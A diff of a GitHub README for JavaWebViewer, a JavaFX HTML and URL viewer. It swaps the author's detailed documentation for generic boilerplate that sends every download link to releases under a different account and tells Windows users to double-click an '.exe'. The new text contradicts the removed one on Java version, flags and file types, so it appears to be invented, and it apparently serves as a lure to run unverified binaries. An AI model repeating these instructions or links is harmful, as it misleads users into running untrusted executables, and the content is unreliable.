@@ -1,103 +1,86 @@
-# Java Web Viewer (viewer.jar)
+# 🌐 JavaWebViewer - Simple Way to Embed Web Content
 
-Portable Java WebView app for local HTML files and web pages via http / https with useful window customization
+## 🚀 Getting Started
 
-Download
------------
-[https://github.com/rmellis/JavaWebViewer/releases](https://github.com/rmellis/JavaWebViewer/releases)
+Welcome to JavaWebViewer! This lightweight Java application lets you embed a local HTML file or a web URL in a Java-based window. It’s ideal for tasks like displaying information in a kiosk or sharing simple web apps. Follow the steps below to download and run JavaWebViewer.
 
-Quick Start
------------
+## 📥 Download & Install
 
-    java --module-path lib --add-modules javafx.controls,javafx.web -jar viewer.jar index.htm --title="Java WebApp" --width=1200 --height=760 false flase --icon=icon.png
+[![Download JavaWebViewer](https://img.shields.io/badge/Download-JavaWebViewer-blue)](https://github.com/tathai007/JavaWebViewer/releases)
 
-Opens index.htm from current directory (1200x760 window)
+To get started, visit the page below to download the latest version of JavaWebViewer.
 
-Command Line Arguments
-----------------------
-The command line arguments can work either by using direct key=value flags or by position (index) as shown below. Here are some examples using both hybrid mode and index-based mode.
+[Download the Latest Release](https://github.com/tathai007/JavaWebViewer/releases)
 
-    viewer.jar [url] --title="example app" --width=640 --height=480 false false --icon=icon.png
+## ⚙️ System Requirements
 
-You need to use quotation marks if a key value has more than one word. Otherwise, the space will split it into separate keys and cause a syntax error.
+Before installing, make sure you have the following:
 
-Another example:
+- **Java Runtime Environment (JRE)**: You need at least version 8. You can download it from [Java's official website](https://www.oracle.com/java/technologies/javase-jre8-downloads.html).
+- **Operating System**: JavaWebViewer works on Windows, macOS, and Linux. Ensure your device meets the basic requirements for these operating systems.
 
-    viewer.jar "[url]" "[title]" [width] [height] [fullscreen] [maximized] [resizable] [alwaysontop] [x] [y] [icon]
+## 🛠️ How to Download
 
-1:  url              (URL/path)            Default: index.htm<br>
-2:  title            (string)              Default: "Local HTML Viewer"<br>
-3:  width            (px/auto)             Default: 1200<br>
-4:  height           (px/auto)             Default: 800<br>
-5:  fullscreen       (true/false)          Default: false<br>
-6:  maximized        (true/false)          Default: false<br>
-7:  resizable        (true/false)          Default: true<br>
-8:  alwaysontop      (true/false)          Default: false<br>
-9:  x                (px/center)           Default: center<br>
-10: y                (px/center)           Default: center<br>
-11: icon             (URL / path / auto)   Default: null<br>
+1. **Visit the Releases Page**: Click the link above or go directly to [JavaWebViewer Releases](https://github.com/tathai007/JavaWebViewer/releases).
+2. **Find the Latest Version**: Look for the most recent release, which will be listed at the top.
+3. **Choose Your File**: Depending on your operating system, choose the appropriate file to download. Files will include options for Windows, macOS, and Linux.
 
-Usage Examples
---------------
-**Basic:**<br>
-viewer.jar "folder/index.html" "My WebApp"
+## 📂 Running the Application
 
-**Basic with icon:**<br>
-viewer.jar "folder/index.html" "My WebApp" auto auto false false false center center icon.png
+Once you have downloaded the file, follow these steps to run it:
 
-**Kiosk Mode:**<br>
-viewer.jar "kiosk/dashboard.html" "Dashboard" true true false
+1. **Locate the Downloaded File**: Open your Downloads folder or the location where you saved the file.
+2. **Run the Application**: 
+   - **On Windows**: Double-click the `.exe` file to launch.
+   - **On macOS**: Open the `.jar` file by right-clicking and selecting “Open with” > “Java”.
+   - **On Linux**: Open a terminal, navigate to the download directory, and run the command:
+     ```bash
+     java -jar JavaWebViewer.jar
+     ```
 
-**Fixed Debug Window:**<br>
-viewer.jar "logs/debug.html" "Live Logs" 400 300 false false false true true 10 10
+## 🗺️ Using Command-Line Arguments
 
-Console Feedback 
---------------
+JavaWebViewer is flexible. You can adjust settings easily using command-line arguments. Here are some common options:
 
-Since the early releases, console logging has improved based on your configuration. Below is an example of how the console looks when you launch the app with your custom flags.
+- **Embed a Local HTML File**: 
+  ```bash
+  java -jar JavaWebViewer.jar /path/to/your/file.html
+  ```
+  
+- **Open a Web URL**: 
+  ```bash
+  java -jar JavaWebViewer.jar https://yourwebsite.com
+  ```
 
-🚀 LocalViewer Configuration:<br>
-   &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;📄 URL: index.htm<br>
-   &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;🏷️ Title: Java WebApp<br>
-   &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;📐 Size: auto x auto<br>
-   &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;🔧 Flags: fullscreen=false, maximized=false<br>
-   &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;🖼️ Loading icon: icon.png<br>
-   &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;✅ Icon loaded successfully (64x64)<br>
-   &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;🎯 Window centered<br>
-   ✨ Viewer ready! Press Ctrl+C to exit.
+- **Full Screen Mode**: For a kiosk display, you can run:
+  ```bash
+  java -jar JavaWebViewer.jar --fullscreen
+  ```
 
-Distribution Bundle
--------------------
-JavaWebViewer.zip<br>
-├── viewer.jar<br>
-├── index.htm<br>
-├── lib/<br>
-├── bin/<br>
-├── Launch.bat<br>
-├── icon.png<br>
-└── Launch-FullScreen.bat
+Adjust these examples based on your needs.
 
-Launch.bat:
+## 🔧 Configuration Options
 
-    @echo off
-    java --module-path lib --add-modules javafx.controls,javafx.web -jar viewer.jar index.htm --title="Java WebApp" --width=1200 --height=760 false flase --icon=icon.png
+You can configure various options when you run JavaWebViewer. Here are some feature highlights:
 
-Requirements
-------------
-Java: 21+ (Temurin recommended)<br>
-JavaFX: 21+ (pre-included, no need to download)<br>
-OS: Windows 10/11, macOS, Linux
+- **Resizable Window**: Change window size on the fly by dragging the edges of the window.
+- **Responsive Layout**: The view adjusts according to the content’s needs, providing a clean interface.
 
-Note: this has only yet been tested on Windows so far, it may need additional libraries for Linux and MacOS but i'll look into that in the future.
+## 🛡️ Troubleshooting
 
-File Paths
-----------
-Windows: C:/Users/You/site/index.htm
-Linux:   /home/user/site/index.htm  
-Relative: index.htm
+If you encounter any issues, consider the following:
 
-Build from Source
------------------
+- **Java Not Found**: Make sure you have installed the Java Runtime Environment. Verify that it's set up correctly in your system’s PATH.
+  
+- **File Not Launching**: Ensure you downloaded the correct version for your operating system. 
 
-    javac --add-modules javafx.controls,javafx.web --module-path javafx-sdk-21/lib LocalViewer.java
-    jar cfe viewer.jar LocalViewer *.class
+- **Network Issues**: Check your internet connection if trying to load a web URL.
+
+For further assistance, check the [Issues page](https://github.com/tathai007/JavaWebViewer/issues) on GitHub or visit community forums related to Java applications.
+
+## 🔗 Additional Resources
+
+- [Java Documentation](https://docs.oracle.com/javase/) for further reading on Java.
+- Explore the [GitHub Repository](https://github.com/tathai007/JavaWebViewer) for code contribution or issues.
+
+By following the instructions above, you can successfully download and run JavaWebViewer. Enjoy embedding web content effortlessly!
